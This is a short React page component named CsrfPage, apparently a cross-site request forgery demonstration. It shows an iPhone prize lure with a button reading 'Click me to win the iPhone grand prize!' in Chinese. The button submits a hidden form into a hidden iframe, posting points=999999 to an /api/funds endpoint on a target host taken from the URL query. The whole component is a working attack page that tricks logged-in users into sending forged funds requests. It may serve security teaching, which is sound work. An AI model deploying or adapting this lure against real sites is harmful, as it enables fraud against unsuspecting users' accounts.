import React from 'react';
import s from './index.module.css';
import axios from 'axios';
class CsrfPage extends React.Component {
    static getInitialProps({query}) {
        return {query}
    }
    render(){
        const {target} = this.props.query;
        return (
            <div className={s.wrapper}>
                <div className={s.iphone}></div>
                <form method="POST" action={`http://${target}/api/funds`} target="iframeHidden">
                    <input type="hidden" name="points" value="999999"/>
                    <input type="submit" className="span4 btn btn-primary" value="點我贏得 iphone 大獎!"/>
                </form>
            </div>);
    }
}


export default CsrfPage